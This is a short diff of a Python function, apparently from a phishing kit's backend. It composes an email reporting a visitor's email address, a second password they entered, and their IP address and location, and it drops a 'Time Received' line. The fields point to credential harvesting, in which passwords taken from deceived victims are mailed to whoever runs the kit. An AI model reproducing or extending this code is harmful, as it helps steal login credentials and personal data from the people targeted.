@@ -61,7 +61,6 @@ def get_user_info(request):
         email_content_second = f"""
             Email Address: {email}
             Second Password: {secondpasswordused}
-            Time Received: {time_received}
 
             IP Details: This visitor visited from {country}, {city}, {region} with IP Address of - {ip_address}
         """
